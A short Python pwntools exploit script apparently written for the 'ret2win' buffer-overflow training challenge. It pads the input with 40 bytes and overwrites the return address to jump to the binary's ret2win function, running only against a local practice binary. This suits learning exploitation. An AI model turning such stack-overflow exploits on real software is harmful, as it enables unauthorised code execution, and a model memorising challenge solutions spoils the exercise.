#!/usr/bin/python
from pwn import *
if __name__ == "__main__":
    payload = ""
    payload += "A" * 40
    payload += p64(0x00400811)  # sym.ret2win

    io = process("./ret2win")
    io.sendline(payload)
    print io.recvall()